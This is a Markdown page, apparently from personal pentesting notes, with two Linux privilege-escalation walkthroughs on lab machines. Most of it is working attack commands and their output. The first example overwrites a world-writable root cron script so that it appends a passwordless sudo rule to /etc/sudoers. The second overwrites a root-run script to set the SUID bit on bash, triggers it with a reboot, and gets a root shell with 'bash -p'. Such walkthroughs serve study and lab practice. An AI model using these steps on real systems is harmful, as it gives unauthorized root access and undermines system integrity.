---
layout: default
title: Overwrite File
parent: Misc Exploits
nav_order: 1
---

# Example 1: Overwrite File

---

## Enumerate Files

There is a _/home/student/message_ file that is owned by root.

```bash
bash-4.4# ls -la /home/student
total 40
drwxr-xr-x 5 student student 4096 Jan 21  2022 .
drwxr-xr-x 4 root    root    4096 Jan 21  2022 ..
-rw------- 1 student student   62 Jan 21  2022 .bash_history
-rw-r--r-- 1 student student  220 Jan 21  2022 .bash_logout
-rw-r--r-- 1 student student 3772 Jan 21  2022 .bashrc
drwx------ 2 student student 4096 Jan 21  2022 .cache
drwx------ 3 student student 4096 Jan 21  2022 .gnupg
-rw-r--r-- 1 student student  807 Jan 21  2022 .profile
drwxrwxr-x 2 student student 4096 Jan 21  2022 .ssh
-rw------- 1 root    root      27 Jan 21  2022 message
```

There is also a file named message at _/tmp/message_

```bash
bash-4.4# find / -name message

/tmp/message
```

The _/tmp/message_ file is overwritten every minute

```bash
bash-4.4# ls -la /tmp/message
-rw-r--r-- 1 root root 27 Dec 19 03:42 /tmp/message

bash-4.4# ls -la /tmp/message
-rw-r--r-- 1 root root 27 Dec 19 03:43 /tmp/message
```

Some script/binary is copying this file from the student home directory to /tmp directory.

Let's try to search that script. If the script is doing a simple copy operation, it must have the source destination of the file in it.

Let's try to locate that by using the grep command.

```bash
bash-4.4# grep -nri "/tmp/message" /usr
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message
/usr/local/share/copy.sh:3:chmod 644 /tmp/message
```

We have found the script location, which is copying the message file to the /tmp directory, _/usr/local/share/copy.sh_.

Let's check the permissions on this script file and its contents.

```bash
bash-4.4# ls -la /usr/local/share/copy.sh
-rwxrwxrwx 1 root root 74 Jan 21  2022 /usr/local/share/copy.sh

bash-4.4# cat /usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
```

As the script file is writable by the current student user, we can modify the copy.sh file to execute our commands.

A root cron job manages this script, which allows us to run commands as root after modifying the file.

We will use the printf command to replace the original code with the following lines.

```bash

printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers'
```

These lines will push an entry into the /etc/sudoers file, which will allow the student user to run all commands as root using sudo without providing any password.

Let's edit the copy.sh script.

```bash
bash-4.4# printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers\n' > /usr/local/share/copy.sh
bash-4.4# cat /usr/local/share/copy.sh
#! /bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
```

Now, we will wait for one minute to allow the cron job to execute the copy.sh script where we have added our code to gain root access.

After one minute, we will check the current sudoers list.

```bash
bash-4.4# sudo -l
Matching Defaults entries for student on ip-10-4-16-223:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on ip-10-4-16-223:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL
```

We can observe that we can use sudo to access all resources on the system.

Let's switch to the root user using sudo.

```bash
bash-4.4# sudo su
root@ip-10-4-16-223:/home/student# whoami
root

root@ip-10-4-16-223:/home/student# id
uid=0(root) gid=0(root) groups=0(root)
```

# Example 2: Overwrite File

---

## Check Sudo Permissions

```bash
tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
```

We have the ability to run the _/sbin/shutdown_ command.

Maybe that will come in handy later.

## Check Processes

```bash
tre@tre:~$ ps aux | grep root

root       417  0.0  0.1   6728  3268 ?        Ss   18:57   0:02 /bin/bash /usr/bin/check-system

```

Checking _/usr/bin/check-system_

```bash
tre@tre:~$ ls -la /usr/bin/check-system
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system

```

We can overrite the file.

```bash
tre@tre:~$ echo "chmod +s /usr/bin/bash" > /usr/bin/check-system
tre@tre:~$ cat /usr/bin/check-system
chmod +s /usr/bin/bash
```

Now we can leverage the sudo permissions on _/sbin/shutdown_

```bash
tre@tre:~$ sudo /sbin/shutdown -r


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/pwned1]
└─$ ssh tre@192.168.213.84
tre@192.168.213.84's password:
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Nov 13 23:04:58 2023 from 192.168.45.217
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(tre) gid=1000(tre) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(tre)
bash-5.0# whoami
root

```
